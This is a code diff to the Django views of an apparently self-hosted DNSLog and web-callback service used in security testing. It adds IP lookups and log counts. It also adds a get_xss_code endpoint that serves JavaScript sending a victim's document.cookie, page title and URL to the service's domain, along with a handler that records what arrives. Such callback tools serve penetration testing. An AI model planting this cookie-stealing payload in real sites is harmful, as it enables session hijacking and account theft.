@@ -20,15 +20,24 @@ from django.contrib.auth import authenticate, login
 from django.conf import settings
 from django.contrib.auth import logout
 from django.utils.translation import gettext as _
+from django.db.models import Q
+from django.db.models import Count
+from django.http import JsonResponse
+from django.db.models import F
 
 
 def get_city_by_ip(ip):
-    try:
-        doc = requests.get('https://whois.pconline.com.cn/ip.jsp?ip=%s' % ip).text
-        city = doc.split(' ')[0]
-    except Exception as e:
-        city = ''
-    return city
+    for _ in range(3):
+        try:
+            doc = requests.get('https://whois.pconline.com.cn/ip.jsp?ip=%s' % ip,
+                               headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
+                                                      '(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'}).text.strip()
+            city = doc.split(' ')[0]
+            if city == '503':
+                continue
+        except Exception as e:
+            city = ''
+        return city
 
 
 @csrf_exempt
@@ -53,7 +62,7 @@ def index(request):
             user_domain = items[-2]
             user = User.objects.filter(user_domain=user_domain)
             if user:
-                city = get_city_by_ip(remote_addr)
+                city = ''    # get_city_by_ip(remote_addr)
                 request_headers = ''
                 for key in request.META:
                     if key.startswith('REQUEST_') or key.startswith('HTTP_') or key.startswith('CONTENT_'):
@@ -260,6 +269,54 @@ def web_view(request):
     return log_view(request, 'web')
 
 
+@csrf_exempt
+def get_xss_code(request):
+    code = """
+fetch('https://%s/u/%s/', {
+method: 'POST',
+mode: 'no-cors',
+body:"cookie=" + document.cookie+'&title='+ document.title + '&location='+ document.location.href
+});
+""" % (settings.DNS_DOMAIN, request.GET.get('u', ''))
+    return HttpResponse(code.strip(), content_type='text/javascript')
+
+
+@csrf_exempt
+def xss_request(request, username):
+    http_host = request.get_host().split(':')[0]
+    if http_host not in settings.ADMIN_DOMAIN:
+        return HttpResponse(request.build_absolute_uri())
+
+    users = User.objects.filter(username=username)
+    if not users:
+        return HttpResponse("No such user")
+
+    user_agent = request.META.get('HTTP_USER_AGENT') or ''
+    user_agent = user_agent[:250]
+    remote_addr = request.META.get('HTTP_X_REAL_IP') or request.META.get('REMOTE_ADDR')
+    path = http_host + request.get_full_path()
+    path = path[:250]
+
+    if not http_host.endswith(settings.DNS_DOMAIN):
+        return HttpResponse("Server Gone", status=502)
+
+    city = ''
+    request_headers = ''
+    for key in request.META:
+        if key.startswith('REQUEST_') or key.startswith('HTTP_') or key.startswith('CONTENT_'):
+            request_headers += key + ': ' + str(request.META[key]) + '\n'
+
+    if request.META.get('REQUEST_METHOD') == 'POST':
+        request_headers += '\n' + request.body.decode()
+
+    weblog = WebLog(user=users[0], path=path, remote_addr=remote_addr,
+                    user_agent=user_agent, city=city, headers=request_headers)
+    weblog.save()
+    if path.find('/rpb.png') >= 0:    # this is for AWVS Scanner
+        return HttpResponse('39a6ea3246b507782676a6d79812fa1d29e12e9c')
+    return HttpResponse('OK')
+
+
 def config_view(request):
     return log_view(request, 'config')
 
@@ -297,7 +354,7 @@ def log_view(request, type):
             page = paginator.num_pages
             logs = paginator.page(paginator.num_pages)
         if request.GET.get('check_update', '') == 'true':
-            if request.GET.get('last_id') == str(logs[0].id):
+            if len(logs) == 0 or request.GET.get('last_id') == str(logs[0].id):
                 return HttpResponse('noChange')
             else:
                 return HttpResponse('Changed')
@@ -376,6 +433,7 @@ def log_view(request, type):
     context['token'] = user.token
     context['username'] = user.username
     context['admin_domain'] = str(settings.ADMIN_DOMAIN)
+    context['xss_test_domain'] = str(settings.ADMIN_DOMAIN[0])
 
     return render(request, 'views.html', context)
 
@@ -402,12 +460,14 @@ def api(request, type, username, prefix):
 
 def group_api(request, username, prefix):
     token = request.GET.get('token', '')
-    if not User.objects.filter(username=username, token=token):
+    user = User.objects.filter(username=username, token=token)
+    if not user:
         return HttpResponse('Invalid token')
     postfix = ".%s.%s.%s" % (prefix, username, settings.DNS_DOMAIN)
-    res = DNSLog.objects.filter(host__endswith=postfix).order_by('host').values('host').distinct()
+    sub_name = prefix.split('.')[-1]
+    res = DNSLog.objects.filter(Q(sub_name=sub_name) & Q(user=user[0])).order_by('host').values('host').distinct()[:50]
     if res:
-        res = res[:50]
+        # res = res[:50]
         data = [item['host'].replace(postfix, '') for item in res]
         text = json.dumps({"success": "true", "data": data})
         return HttpResponse(text, content_type="application/json")
@@ -427,6 +487,34 @@ def as_admin(request):
             login(request, su[0])
             return redirect('/admin/')
     return redirect('/')
+
+
+
+@csrf_exempt
+def ip_to_location(request):
+    ips = request.POST.get('ips', '')
+    if not ips:
+        return HttpResponse('')
+    matches = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', ips)
+    found = {}
+    if matches:
+        for ip in matches[:10]:
+            city = get_city_by_ip(ip)
+            found[ip] = city
+    return HttpResponse(json.dumps(found))
+
+
+def ip_count(request, type):
+    userid = request.session.get('userid', None)
+    if not userid:
+        return redirect('/login')
+    obj = []
+    if type == 'dns':
+        obj = DNSLog.objects.filter(Q(user_id=userid)).values('ip').annotate(total=Count('ip')).order_by('-total', 'ip')
+    elif type == 'web':
+        obj = WebLog.objects.filter(Q(user_id=userid)).values('remote_addr').annotate(total=Count('remote_addr')).annotate(ip= F('remote_addr')).order_by('-total', 'ip')
+
+    return JsonResponse({"data": list(obj)}, safe=False)
 
 
 def config_update(request):
